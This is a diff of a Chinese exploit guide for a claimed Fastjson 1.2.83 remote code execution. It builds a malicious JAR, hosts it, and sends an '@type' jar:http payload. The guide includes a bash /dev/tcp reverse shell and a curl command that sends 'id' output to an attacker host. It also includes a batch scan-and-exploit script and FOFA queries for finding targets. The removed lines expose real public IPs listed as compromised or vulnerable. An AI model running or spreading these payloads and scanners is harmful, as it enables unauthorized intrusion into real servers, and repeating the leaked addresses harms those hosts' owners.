@@ -41,9 +41,9 @@ Step 5 ── Runtime.exec("/bin/bash", "-c", "命令") → RCE
 ### 1. 下载 JDK 8
 
 ```bash
-# 使用 Zulu JDK 8.0.482（与目标环境版本一致）
-wget https://cdn.azul.com/zulu/bin/zulu8.92.0.21-ca-jdk8.0.482-win_x64.zip
-unzip zulu8.92.0.21-ca-jdk8.0.482-win_x64.zip
+# 使用 Zulu JDK 8（与目标环境版本一致）
+wget https://cdn.azul.com/zulu/bin/zulu8.x.xx-ca-jdk8.0.xxx-win_x64.zip
+unzip zulu8.x.xx-ca-jdk8.0.xxx-win_x64.zip
 ```
 
 ### 2. 下载依赖库
@@ -105,12 +105,12 @@ body="fastjson" && country="IN" && port="18080"
 
 ```bash
 # 设置 JDK 8 环境
-export JAVA_HOME=/path/to/zulu8.92.0.21-ca-jdk8.0.482
+export JAVA_HOME=/path/to/jdk8
 export PATH=$JAVA_HOME/bin:$PATH
 
 # 验证
 java -version
-# 输出: java version "1.8.0_482"
+# 输出: openjdk version "1.8.0_xxx"
 
 # 编译 GenProbe.java
 javac -encoding utf-8 \
@@ -128,19 +128,21 @@ ls -la poc/GenProbe.class
 # java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" \
 #   GenProbe <攻击者IP> <HTTP端口> <要执行的命令>
 
+# IP转整数示例：1.2.3.4 → 16909060
+
 # 示例1：id 命令（验证 RCE）
 java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" \
-  GenProbe 141.11.2.101 80 \
-  "curl http://141.11.2.101:80/id-\$(id|sed 's/ /_/g')"
+  GenProbe ATTACKER_IP ATTACKER_PORT \
+  "curl http://ATTACKER_IP:ATTACKER_PORT/id-\$(id|sed 's/ /_/g')"
 
 # 示例2：反弹 shell（Linux 目标）
 java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" \
-  GenProbe 141.11.2.101 80 \
-  "bash -i >& /dev/tcp/141.11.2.101/4444 0>&1"
+  GenProbe ATTACKER_IP ATTACKER_PORT \
+  "bash -i >& /dev/tcp/ATTACKER_IP/REV_PORT 0>&1"
 
 # 示例3：Windows 弹计算器
 java -cp "poc:poc/lib/asm-9.6.jar:poc/lib/fastjson-1.2.83.jar" \
-  GenProbe 192.168.1.100 80 "calc"
+  GenProbe ATTACKER_IP ATTACKER_PORT "calc"
 ```
 
 **生成文件说明：**
@@ -166,13 +168,13 @@ poc/www/probe  ── HTTP 托管文件（与 probe.jar 内容相同）
 cd poc/www
 
 # 方式1：使用 Python
-python3 -m http.server 80
+python3 -m http.server ATTACKER_PORT
 
-# 方式2：使用 Python（指定端口）
+# 方式2：使用 Python（其他端口）
 python3 -m http.server 19090
 
 # 验证服务是否正常（另开终端）
-curl -s http://127.0.0.1:80/probe | file -
+curl -s http://127.0.0.1:ATTACKER_PORT/probe | file -
 # 输出: /dev/stdin: Java archive data (zip)
 ```
 
@@ -186,20 +188,20 @@ curl -s http://127.0.0.1:80/probe | file -
 
 # 示例
 python3 poc/exp.py \
-  -u http://8.216.40.190:8080/api/parse \
-  -poc http://141.11.2.101:80/probe
+  -u http://TARGET_IP:TARGET_PORT/api/parse \
+  -poc http://ATTACKER_IP:ATTACKER_PORT/probe
 ```
 
 **执行过程输出：**
 
 ```
-[*] Target:  http://8.216.40.190:8080/api/parse
-[*] POC URL: http://141.11.2.101:80/probe
-[*] Payload: {"@type": "jar:http:..2366308965:80.probe!.POC", "x": 1}
+[*] Target:  http://TARGET_IP:TARGET_PORT/api/parse
+[*] POC URL: http://ATTACKER_IP:ATTACKER_PORT/probe
+[*] Payload: {"@type": "jar:http:..IP_INT:PORT.probe!.POC", "x": 1}
 
 [*] Sending...
 [*] Response: 200
-[*] Body: {"success":false,"error":"com.alibaba.fastjson.JSONException: autoType is not support. jar:http:..2366308965:80.probe!.POC"}
+[*] Body: {"success":false,"error":"com.alibaba.fastjson.JSONException: autoType is not support. jar:http:..IP_INT:PORT.probe!.POC"}
 
 [-] Class not loaded. Check conditions.
 [*] If POC server received GET request, SSRF confirmed.
@@ -208,26 +210,26 @@ python3 poc/exp.py \
 **手动发送（使用 curl）：**
 
 ```bash
-curl -X POST http://target:8080/api/parse \
+curl -X POST http://TARGET_IP:TARGET_PORT/api/parse \
   -H "Content-Type: application/json" \
-  -d '{"@type":"jar:http:..2366308965:80.probe!.POC","x":1}'
+  -d '{"@type":"jar:http:..IP_INT:PORT.probe!.POC","x":1}'
 ```
 
 **请求包：**
 ```
 POST /api/parse HTTP/1.1
-Host: 8.216.40.190:8080
+Host: TARGET_IP:TARGET_PORT
 Content-Type: application/json
 Content-Length: 68
 
-{"@type":"jar:http:..2366308965:80.probe!.POC","x":1}
+{"@type":"jar:http:..IP_INT:PORT.probe!.POC","x":1}
 ```
 
 **SSRF 成功响应（autoType 阻止类加载）：**
 ```json
 {
   "success": false,
-  "error": "com.alibaba.fastjson.JSONException: autoType is not support. jar:http:..2366308965:80.probe!.POC"
+  "error": "com.alibaba.fastjson.JSONException: autoType is not support. jar:http:..IP_INT:PORT.probe!.POC"
 }
 ```
 
@@ -237,7 +239,7 @@ Content-Length: 68
   "status": "ok",
   "parse_time_ms": 139,
   "autoTypeSupport": false,
-  "result_type": "jar:http:..2366308965:80.pwn2!.PWN",
+  "result_type": "jar:http:..IP_INT:PORT.pwn2!.PWN",
   "pwned": true
 }
 ```
@@ -248,10 +250,10 @@ Content-Length: 68
 
 ```
 # SSRF 成功（JAR 被下载）
-[15:48:32] TARGET_IP - "GET /probe HTTP/1.1" 200 -
+[TIMESTAMP] TARGET_IP - "GET /probe HTTP/1.1" 200 -
 
 # RCE 成功（命令被执行）
-[15:48:32] TARGET_IP - "GET /id-uid=0(root)_gid=0(root)_groups=0(root) HTTP/1.1" 404 -
+[TIMESTAMP] TARGET_IP - "GET /id-uid=0(root)_gid=0(root)_groups=0(root) HTTP/1.1" 404 -
 ```
 
 ### 第七步：更换类名绕过 JVM 缓存
@@ -278,7 +280,7 @@ Path wwwPath = Paths.get("poc/www/pwn2");
 重新编译生成后，使用新的 payload 发送：
 
 ```bash
-{"@type":"jar:http:..2366308965:80.pwn2!.PWN","x":1}
+{"@type":"jar:http:..IP_INT:PORT.pwn2!.PWN","x":1}
 ```
 
 ## 成功标志
@@ -287,9 +289,9 @@ Path wwwPath = Paths.get("poc/www/pwn2");
 |:---|:---|
 | HTTP 日志出现 `GET /probe from TARGET_IP` | **SSRF 成功**（远程 JAR 被下载） |
 | HTTP 日志出现 `GET /id-xxx from TARGET_IP` | **RCE 成功**（命令被执行） |
-| exp.py 请求超时 + HTTP 服务器收到回调 | **RCE 已触发**（PoC 作者标准） |
-| HTTP 响应 `"status":"ok"` + `result_type` 为 jar:http | **类加载成功** |
-| HTTP 响应包含 `NoClassDefFoundError` | **defineClass 被调用**（类名含特殊字符） |
+| exp.py 请求超时 + HTTP 服务器收到回调 | **RCE 已触发** |
+| HTTP 响应 `"status":"ok"` + `result_type` 为 jar:http 格式 | **类加载成功** |
+| HTTP 响应包含 `NoClassDefFoundError` | **defineClass 被调用** |
 
 ## 批量检测脚本
 
@@ -303,22 +305,22 @@ Fastjson 1.2.83 @JSONType RCE 批量检测+利用脚本
 
 用法:
     单目标检测:
-        python3 scanner.py -u http://target:8080 --cb 1.2.3.4:80
+        python3 scanner.py -u http://target:8080 --cb attacker.com:80
 
     批量检测:
-        python3 scanner.py -f targets.txt --cb 1.2.3.4:80
+        python3 scanner.py -f targets.txt --cb attacker.com:80
 
     检测+利用:
-        python3 scanner.py -u http://target:8080 --cb 1.2.3.4:80 --exploit --cmd "id"
+        python3 scanner.py -u http://target:8080 --cb attacker.com:80 --exploit
 
     生成 probe:
-        python3 scanner.py --gen-probe 1.2.3.4 80 "curl http://1.2.3.4:80/id-\$(id)"
+        python3 scanner.py --gen-probe attacker.com 80 "id"
 
 依赖:
     pip install requests
 """
 import requests, sys, urllib3, argparse, concurrent.futures
-import struct, socket, time, os, subprocess, json
+import struct, socket, time, os, subprocess
 
 urllib3.disable_warnings()
 
@@ -382,12 +384,11 @@ def check_target(url, cb_host, cb_port):
     return (url, "SAFE", "所有端点均 404")
 
 
-def exploit_target(url, cb_host, cb_port, cmd, java_path, genprobe_dir):
+def exploit_target(url, cb_host, cb_port):
     """对目标执行利用"""
     base = url.rstrip("/")
 
     for cls_name in CLASS_NAMES:
-        # 生成带唯一类名的 payload
         payload = make_payload(cb_host, cb_port, cls_name)
         print("  [EXPLOIT] 发送 %s ..." % cls_name, end=" ", flush=True)
 
@@ -417,10 +418,8 @@ def gen_probe(java_path, genprobe_dir, cb_host, cb_port, cmd):
     lib_dir = os.path.join(genprobe_dir, "lib")
     cp = "%s;%s;%s" % (
         genprobe_dir,
-        os.path.join(lib_dir, "asm-9.6.jar") if os.path.exists(lib_dir)
-        else os.path.join(genprobe_dir, "asm-9.6.jar"),
-        os.path.join(lib_dir, "fastjson-1.2.83.jar") if os.path.exists(lib_dir)
-        else os.path.join(genprobe_dir, "fastjson-1.2.83.jar"),
+        os.path.join(lib_dir, "asm-9.6.jar") or os.path.join(genprobe_dir, "asm-9.6.jar"),
+        os.path.join(lib_dir, "fastjson-1.2.83.jar") or os.path.join(genprobe_dir, "fastjson-1.2.83.jar"),
     )
 
     cmd_parts = [java_path, "-cp", cp, "GenProbe", cb_host, str(cb_port), cmd]
@@ -446,13 +445,13 @@ def main():
         epilog="""
 使用示例:
   # 扫描单个目标
-  python3 scanner.py -u http://192.168.1.1:8080 --cb vps.com:80
+  python3 scanner.py -u http://target:8080 --cb vps.com:80
 
   # 批量扫描
   python3 scanner.py -f targets.txt --cb vps.com:80
 
   # 扫描+利用
-  python3 scanner.py -u http://192.168.1.1:8080 --cb vps.com:80 --exploit
+  python3 scanner.py -u http://target:8080 --cb vps.com:80 --exploit
 
   # 仅生成 probe
   python3 scanner.py --gen-probe vps.com 80 "id"
@@ -475,13 +474,11 @@ def main():
 
     args = parser.parse_args()
 
-    # 生成 probe 模式
     if args.gen_probe:
         gen_probe(args.java, args.genprobe_dir,
                   args.gen_probe[0], args.gen_probe[1], args.gen_probe[2])
         return
 
-    # 检测/利用模式
     if not args.url and not args.file:
         parser.print_help()
         return
@@ -506,13 +503,10 @@ def main():
     print("并发线程: %d" % args.threads)
     print("=" * 70)
 
-    # 开始扫描
     results = {"SAFE": [], "SSRF": [], "RCE": [], "TIMEOUT": [], "UNKNOWN": []}
     scan_start = time.time()
 
-    with concurrent.futures.ThreadPoolExecutor(
-        max_workers=args.threads
-    ) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
         fut_map = {
             executor.submit(check_target, t, cb_host, cb_port): t
             for t in targets
@@ -528,11 +522,10 @@ def main():
             elif status == "TIMEOUT":
                 print("[????]  %s - %s" % (url, detail))
             elif status == "UNKNOWN":
-                print "[UNKWN] %s - %s" % (url, detail))
+                print("[UNKWN] %s - %s" % (url, detail))
             else:
                 print("[SAFE]  %s" % url)
 
-    # 输出统计
     elapsed = time.time() - scan_start
     print()
     print("=" * 70)
@@ -544,12 +537,10 @@ def main():
     print("  SAFE:    %d" % len(results["SAFE"]))
     print("=" * 70)
 
-    # 利用模式
     if args.exploit and results["RCE"]:
         print("\n[*] 开始利用 RCE 目标...")
         for url, detail in results["RCE"]:
-            exploit_target(url, cb_host, cb_port, args.cmd,
-                          args.java, args.genprobe_dir)
+            exploit_target(url, cb_host, cb_port)
 
 
 if __name__ == "__main__":
@@ -560,15 +551,15 @@ if __name__ == "__main__":
 
 **单目标扫描：**
 ```bash
-$ python3 scanner.py -u http://8.216.40.190:8080 --cb 141.11.2.101:80
+$ python3 scanner.py -u http://TARGET_IP:8080 --cb ATTACKER_IP:80
 
 ======================================================================
 Fastjson 1.2.83 @JSONType RCE Scanner v1.0.0
-回调服务器: 141.11.2.101:80
+回调服务器: ATTACKER_IP:80
 目标数量: 1
 并发线程: 20
 ======================================================================
-[SSRF]  http://8.216.40.190:8080 - /api/parse autoType触发
+[SSRF]  http://TARGET_IP:8080 - /api/parse autoType触发
 
 ======================================================================
 扫描完成 (耗时: 8.3 秒)
@@ -582,22 +573,22 @@ Fastjson 1.2.83 @JSONType RCE Scanner v1.0.0
 
 **多目标批量扫描：**
 ```bash
-$ python3 scanner.py -f targets.txt --cb 141.11.2.101:80
+$ python3 scanner.py -f targets.txt --cb ATTACKER_IP:80
 
 ======================================================================
 Fastjson 1.2.83 @JSONType RCE Scanner v1.0.0
-回调服务器: 141.11.2.101:80
+回调服务器: ATTACKER_IP:80
 目标数量: 12
 并发线程: 20
 ======================================================================
-[RCE]   http://101.32.115.241:8080 - / 返回status=ok
-[SSRF]  http://8.216.40.190:8080 - /api/parse autoType触发
-[SSRF]  http://107.175.32.45:8080 - /parse autoType触发
-[????]  http://101.43.10.15:80 - /login 请求超时
-[SSRF]  http://129.226.58.115:8080 - /submit autoType触发
-[SSRF]  http://38.76.205.195:18080 - /login autoType触发
-[SAFE]  http://45.32.115.37:80
-[SAFE]  http://83.229.126.208:80
+[RCE]   http://TARGET_A:8080 - / 返回status=ok
+[SSRF]  http://TARGET_B:8080 - /api/parse autoType触发
+[SSRF]  http://TARGET_C:8080 - /parse autoType触发
+[????]  http://TARGET_D:80 - /login 请求超时
+[SSRF]  http://TARGET_E:8080 - /submit autoType触发
+[SSRF]  http://TARGET_F:18080 - /login autoType触发
+[SAFE]  http://TARGET_G:80
+[SAFE]  http://TARGET_H:80
 ...
 
 ======================================================================
@@ -612,11 +603,12 @@ Fastjson 1.2.83 @JSONType RCE Scanner v1.0.0
 
 **生成 probe 文件：**
 ```bash
-$ python3 scanner.py --gen-probe 141.11.2.101 80 "curl http://141.11.2.101:80/id-\$(id|sed 's/ /_/g')"
+$ python3 scanner.py --gen-probe ATTACKER_IP ATTACKER_PORT \
+    "curl http://ATTACKER_IP:ATTACKER_PORT/id-\$(id|sed 's/ /_/g')"
 
-[*] 执行: java -cp .;asm-9.6.jar;fastjson-1.2.83.jar GenProbe 141.11.2.101 80 curl ...
+[*] 执行: java -cp .;asm-9.6.jar;fastjson-1.2.83.jar GenProbe ATTACKER_IP ...
 [+] poc/probe.jar & poc/www/probe generated
-[+] Payload: {"@type":"jar:http:..2366308965:80.probe!.POC","x":1}
+[+] Payload: {"@type":"jar:http:..IP_INT:PORT.probe!.POC","x":1}
 [+] probe 已生成: poc/www/probe (510 bytes)
 ```
 
@@ -625,8 +617,8 @@ $ python3 scanner.py --gen-probe 141.11.2.101 80 "curl http://141.11.2.101:80/id
 $ python3 -m http.server 80
 
 Serving HTTP on 0.0.0.0 port 80 ...
-TARGET_IP - - "GET /probe HTTP/1.1" 200 -        ← SSRF: JAR 被下载
-TARGET_IP - - "GET /id-uid=0(root)_gid=0(root)_groups=0(root) HTTP/1.1" 404 -  ← RCE: 命令执行成功
+TARGET_IP - - "GET /probe HTTP/1.1" 200 -           ← SSRF
+TARGET_IP - - "GET /id-uid=0(root)_gid=0(root)_groups=0(root) HTTP/1.1" 404 -  ← RCE
 ```
 
 ## FOFA搜索语法
@@ -662,5 +654,3 @@ body="LaunchedURLClassLoader"
 ## 参考链接
 
 - https://github.com/0x7eTeam/fastjson-1.2.83-rce
-- https://github.com/alibaba/fastjson
-- https://github.com/Blushl/redteam-notes
